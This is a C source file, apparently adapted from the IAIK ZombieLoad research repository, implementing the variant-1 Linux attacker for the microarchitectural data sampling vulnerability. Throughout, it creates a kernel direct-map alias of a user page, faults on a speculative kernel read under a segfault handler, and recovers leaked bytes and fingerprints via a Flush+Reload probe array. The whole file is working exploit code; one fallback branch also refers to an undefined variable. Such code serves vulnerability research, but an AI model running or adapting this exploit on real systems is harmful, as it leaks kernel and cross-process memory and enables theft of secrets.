/*
 * Based on
 *   https://github.com/IAIK/ZombieLoad/blob/bcd9c99d5c9164d23d45de584c63a8c92c6662d5/attacker/variant1_linux/main.c
 */

#include "zombieload.h"

// from cacheutils
extern jmp_buf trycatch_buf;

// from main
extern sample* samples;
extern size_t num_samples;

// probe array
#define MEM_SIZE ((NUM_BYTES + NUM_FINGERPRINTS) * 4096)
#if USE_HUGEPAGE_PROBE_ARRAY
	uint8_t* mem;
#else
	uint8_t __attribute__((aligned(4096))) mem[MEM_SIZE];
#endif

int fnr_threshold;
size_t sample_counter = 0;

void zombieload_collect_samples_v1() {
	// Determine Flush+Reload Threshold
	fnr_threshold = detect_flush_reload_threshold();
	printf("[ZL] F+R Threshold: %u\n", fnr_threshold);

#if USE_HUGEPAGE_PROBE_ARRAY
	// Allocate probe array on huge pages
	mem = mmap(
		NULL, MEM_SIZE, PROT_READ | PROT_WRITE,
		MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB,
		-1, 0
	);
	if(mem == MAP_FAILED) {
		perror("mmap failed");
		puts("Maybe you have to enable huge pages first?\n\tsudo sysctl -w vm.nr_hugepages=16");
		exit(1);
	}
#endif

	// Initialize and flush probe array
	memset(mem, 0, MEM_SIZE);
	for (size_t i = 0; i < 256; i++) {
		flush(mem + i * 4096);
	}

	// Create a zombieload mapping, i.e. allocate a valid page and find its
	// kernel address in the direct-physical map
	zombieload_mapping mapping = create_mapping();
	
	// setup signal handler
	signal(SIGSEGV, trycatch_segfault_handler);
	
	// collect samples until num_samples is reached
	while(sample_counter < num_samples) {
		// collect samples
		zombieload_sample_v1(mapping, rand() % NUM_POSITIONS, NUM_ITERATIONS_PER_POS);
	}

	// collected enough samples, clean up the mapping
	destroy_mapping(mapping);

#if USE_HUGEPAGE_PROBE_ARRAY
	// unmap probe array
	munmap(mem, MEM_SIZE);
#endif
}

// Helper function to create a zombieload mapping. Returns a zombieload_mapping
// strcture containing two pointers:
//  * mapping: user address
//  * target: kernel address
zombieload_mapping create_mapping() {
	zombieload_mapping m;

	// Get a valid page and its direct physical map address (i.e., a kernel mapping to the page)
	m.mapping = (uint8_t *)mmap(0, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
	memset(m.mapping, 1, 4096);
	size_t paddr = get_physical_address((size_t)m.mapping);
	if (!paddr) {
		printf("[ZL] [!] Could not get physical address! Did you start as root?\n");
		exit(1);
	}
	m.target = (uint8_t *)(get_direct_physical_map() + paddr);

	printf("[ZL] Mapping address: %p\n", m.mapping);
	printf("[ZL] Kernel  address: %p\n", m.target);
	return m;
}

// Unmap a zombieload_mapping
void destroy_mapping(zombieload_mapping m) {
	munmap(m.mapping, 4096);
}

void zombieload_sample_v1(zombieload_mapping m, size_t pos, size_t num_iterations) {
#if USE_HUGEPAGE_PROBE_ARRAY
	// make sure the address of the 2MB probe array page is present in the TLB
	// (flush the first element)
	flush(mem);
#endif
	for (size_t register i = 0; i < num_iterations; i++) {
		// Ensure the kernel mapping refers to a value not in the cache
		flush(m.mapping);

		// Dereference the kernel address and encode in LUT
		// Not in cache -> reads load buffer entry
		if (!setjmp(trycatch_buf)) {
			maccess(0);
			
			// Compute fingerprint
#if USE_ASM_XOR
			// Read the first 64 bits (8 bytes) from the cache line
			uint64_t register r0  = *((uint64_t*)m.target);
			uint64_t register r1 = 0;
			
			// XOR all bytes in r0 (x0 XOR x1 XOR x2 XOR x3 XOR x4 XOR x5 XOR x6 XOR x7)
			// (based on https://stackoverflow.com/a/49213494)
			asm volatile (
				"shld $32, %0, %1\n\t"   // r1  = x0|x1|x2|x3
				"xor %k0, %k1\n\t"       // r1d = (x0|x1|x2|x3) XOR (x4|x5|x6|x7)
				"shld $16, %k1, %k0\n\t" // r0d = ...|x0 XOR x4|x1 XOR x5
				"xor %w0, %w1\n\t"       // r1w = (x0 XOR x2 XOR x4 XOR x6|x1 XOR x3 XOR x5 XOR x7)
				"shld $8, %w1, %w0\n\t"  // r0w = ...|x0 XOR x2 XOR x4 XOR x6
				"xor %b1, %b0\n\t"       // r0b = x0 XOR x1 XOR x2 XOR x3 XOR x4 XOR x5 XOR x6 XOR x7
				"and $0xff, %0"          // only preserve the lower byte of r0
				: "+q" (r0),
				  "+q" (r1)
				: // no dedicated input
				: "cc" // Modifies flag registers
			);
#else
			// Read the first 64 bits (8 bytes) from the cache line
			uint64_t r0 = *((uint64_t*)mapping);
			// XOR all bytes in r0 (x0 XOR x1 XOR x2 XOR x3 XOR x4 XOR x5 XOR x6 XOR x7)
			r0 = (r0 >> 32) ^ r0;
			r0 = (r0 >> 16) ^ r0;
			r0 = ((r0 >> 8) ^ r0) & 0xff;
#endif
			// Leak byte at position pos to the first half of the probe array
			maccess(mem + 4096 * m.target[pos]);
			// Leak fingerprint to the second half of the probe array (1048576=4096*256)
			maccess(mem + 1048576 + 4096 * r0);
		}
		recover(pos);
	}
}

// Recover value from cache (F+R); send result to main process
void recover(uint8_t pos) {
	if (sample_counter >= num_samples) return;

	// We already know the position...
	samples[sample_counter].pos = pos;

	// set a dummy fingerprint for the case no fingerprint is found
	uint8_t fingerprint = 0xff;

	// First, find the fingerprint
	// For each possible fingerprint value i...
	for (size_t i = 0; i < NUM_FINGERPRINTS; i++) {
		// Do a reload + flush sequence.
		// If it's a cache hit...
		if (flush_reload((uint8_t *)mem + (4096*NUM_BYTES) + 4096 * i, fnr_threshold)) {
			fingerprint = i;
			break;
		}
	}

	// Recover the byte value
	// DEBUG: exclude 0x00
	for (size_t i = 0x01; i <= 0xff; i++) {
		// Do a reload + flush sequence.
		// If it's a cache hit...
		if (flush_reload((uint8_t *)mem + 4096 * i, fnr_threshold)) {
			// store sample
			samples[sample_counter].byte = i;
			samples[sample_counter].pos = pos;
			samples[sample_counter].fingerprint = fingerprint;
			sample_counter++;
			if (sample_counter >= num_samples) return;
		}
	}
}
